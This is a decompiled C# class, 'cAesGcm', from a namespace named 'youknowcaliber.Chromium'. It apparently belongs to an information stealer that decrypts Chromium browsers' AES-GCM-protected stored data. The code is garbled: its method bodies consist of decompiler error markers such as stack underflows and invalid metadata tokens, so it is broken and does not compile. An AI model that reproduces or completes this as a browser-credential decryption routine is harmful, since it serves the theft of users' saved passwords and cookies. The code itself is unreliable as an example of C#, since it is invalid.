using System;

namespace youknowcaliber.Chromium;

internal class cAesGcm
{
	public extern byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag);

	private extern int MaxAuthTagSize(IntPtr hAlg);

	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		//Discarded unreachable code: IL_0007, IL_000e, IL_0013, IL_001c
		/*OpCode not supported: DebugBreak*/;
		_ = (uint)/*Error near IL_0002: Stack underflow*/;
		/*Error near IL_0002: Invalid metadata token*/;
	}

	private unsafe IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_000d: Unsupported input type for neg.
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			nint num = checked((nint)/*Error near IL_0001: Stack underflow*/);
			_ = ((uint[])/*Error near IL_0003: Stack underflow*/)[(double)num];
			/*Error near IL_0004: stloc 0 (out-of-bounds)*/;
			ushort num2 = *(ushort*)(nint)/*Error near IL_0007: Stack underflow*/;
			if ((int)/*Error near IL_000c: Stack underflow*/ <= (int)num2)
			{
				/*OpCode not supported: DebugBreak*/;
				_003F val = 0 - /*Error near IL_000e: Stack underflow*/;
				if (/*Error near IL_0013: Stack underflow*/ == val)
				{
					break;
				}
			}
		}
		checked
		{
			_ = (uint)/*Error near IL_0014: Stack underflow*/;
			_ = null;
			/*Error: Unexpected end of block*/;
		}
	}

	private extern byte[] GetProperty(IntPtr hAlg, string name);

	public extern byte[] Concat(byte[][] arrays);

	public extern cAesGcm();
}
